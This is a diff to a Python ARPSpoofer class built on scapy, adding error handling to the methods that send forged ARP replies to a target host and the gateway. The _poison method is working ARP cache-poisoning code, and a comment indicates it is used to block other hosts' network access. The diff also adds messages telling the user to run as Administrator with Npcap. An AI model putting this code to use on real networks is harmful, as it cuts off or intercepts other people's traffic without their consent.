@@ -114,10 +114,15 @@ class ARPSpoofer:
 
     def _poison(self, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str) -> None:
-        self._send(target_mac,
-                   ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip))
-        self._send(gateway_mac,
-                   ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+        ok1 = self._send(target_mac,
+                         ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip))
+        ok2 = self._send(gateway_mac,
+                         ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+        if not ok1 or not ok2:
+            # Stop the loop — can't block without admin/Npcap
+            with self._lock:
+                if target_ip in self._state:
+                    self._state[target_ip]["running"] = False
 
     def _restore(self, target_ip: str, target_mac: str,
                  gateway_ip: str, gateway_mac: str) -> None:
@@ -131,9 +136,12 @@ class ARPSpoofer:
                        psrc=target_ip, hwsrc=target_mac),  count=4)
 
     def _send(self, dst_mac: str, arp_pkt,
-              count: int = 1) -> None:
+              count: int = 1) -> bool:
         try:
             sendp(Ether(dst=dst_mac) / arp_pkt,
                   iface=self._iface, verbose=0, count=count)
+            return True
         except Exception as e:
-            print(f"[spoofer] {e}")
+            print(f"[spoofer] SEND FAILED: {e}")
+            print(f"[spoofer] Make sure you are running as Administrator and Npcap is installed.")
+            return False
